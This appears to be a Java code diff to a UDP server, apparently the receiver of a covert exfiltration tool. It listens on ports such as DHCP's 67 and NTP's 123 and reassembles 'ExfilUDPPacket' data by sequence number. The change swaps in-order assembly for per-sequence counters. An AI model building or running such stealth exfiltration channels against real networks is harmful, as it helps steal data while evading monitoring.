@@ -23,9 +23,10 @@ public class MultiserviceStealthUDPServer extends Thread {
     
     private byte[] buf = new byte[512];
     Random rand;
-    public static ArrayList<Byte> totalRecieved = new ArrayList<Byte>();
-    private ArrayList<ExfilUDPPacket> recieveQueue = new ArrayList<ExfilUDPPacket>();
-    private static int expectedSeqNum = 0;
+    public static ArrayList<ExfilUDPPacket> recieveQueue = new ArrayList<ExfilUDPPacket>();
+    
+    public static int[] sequencePositions = new int[256];
+    
     public MultiserviceStealthUDPServer(int randSeed) throws SocketException {
         rand = new Random(randSeed);
         
@@ -35,10 +36,9 @@ public class MultiserviceStealthUDPServer extends Thread {
         availablePorts.add(67);
         availablePorts.add(123);
     }
-    
-    public static void clearTotalRecieved(){
-    	MultiserviceStealthUDPServer.totalRecieved.clear();
-    	MultiserviceStealthUDPServer.expectedSeqNum = 0;
+    public static void clearRecievedQueue(){
+    	recieveQueue.clear();
+    	Arrays.fill(sequencePositions, 0);
     }
     
     public MultiserviceStealthUDPServer() throws SocketException {
@@ -129,22 +129,18 @@ public class MultiserviceStealthUDPServer extends Thread {
             		dataBuf[i-dataBounds[0]] = buf[i];
             	}
             }
-            ExfilUDPPacket curPack = new ExfilUDPPacket(dataBuf, buf[dataBounds[1]]);
-            this.recieveQueue.add(curPack);
-            ArrayList<ExfilUDPPacket> currRecieveQueue = new ArrayList<ExfilUDPPacket>();
-            for(ExfilUDPPacket eup : recieveQueue){
-            	currRecieveQueue.add(eup);
-            }
-            for(ExfilUDPPacket eup : currRecieveQueue){
-            	if(eup.getSeqNum()==expectedSeqNum){ //Multithreading really fucks with this
-            		for(byte b : eup.getData()){
-            			totalRecieved.add(b);
-            			expectedSeqNum++;
-            		}
-            		recieveQueue.remove(eup);
-            	}
-            }
+            System.out.println("Recieved pack no. "+toUnsigned(buf[dataBounds[1]]));
+            ExfilUDPPacket curPack = new ExfilUDPPacket(dataBuf, buf[dataBounds[1]],sequencePositions[toUnsigned(buf[dataBounds[1]])]++);
+            recieveQueue.add(curPack);
             Arrays.fill(buf,(byte)0);
         }
+    }
+    
+    private int toUnsigned(int input){
+    	if(input<0){
+    		return input+256;
+    	}else{
+    		return input;
+    	}
     }
 }
